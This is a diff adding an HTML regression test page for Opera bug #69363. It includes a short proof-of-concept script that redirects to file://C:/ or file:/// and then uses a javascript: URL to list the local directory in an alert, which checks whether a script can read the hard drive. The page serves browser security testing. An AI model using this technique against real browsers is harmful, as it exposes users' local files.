@@ -1,0 +1,37 @@
+<html>
+<body>
+
+<noscript>
+<h1 align=center>YOU MUST ENABLE SCRIPTING!</h1>
+</noscript>
+
+<p>This relates to <a
+href="https://bugs.opera.com/show_bug.cgi?id=69363">bug #69363</a>.
+By using a javascript: URL and an alert, it is possible for a script
+to access the hard drive even when it is not loaded from a file:
+URL.</p>
+
+<p>When you run this, you should see two alerts.  The first is just a
+way of setting up the attack.  The second is the more important one:
+if it lists the contents of the C:\ drive then the security hole is
+still there.  If not, then the hole is closed (though you can see
+different kinds of behaviors in this second dialog box).</p>
+
+<p>The test has been adapted to Windows and Unix-like directory systems
+so far, but not to Mac.</p>
+
+<script>
+function changeloc()
+{
+    if (navigator.userAgent.indexOf("Windows") != -1)
+      document.location="file://C:/";
+    else
+      document.location="file:///";
+    alert("This alert is here to enable the sniffing...");
+}
+</script>
+
+<a href="javascript:var s='', i; for (i=0;i<document.links.length;i++) s+=document.links[i]+'\n'; alert(s);" onClick="changeloc();">Click here</a>
+
+</body>
+</html>
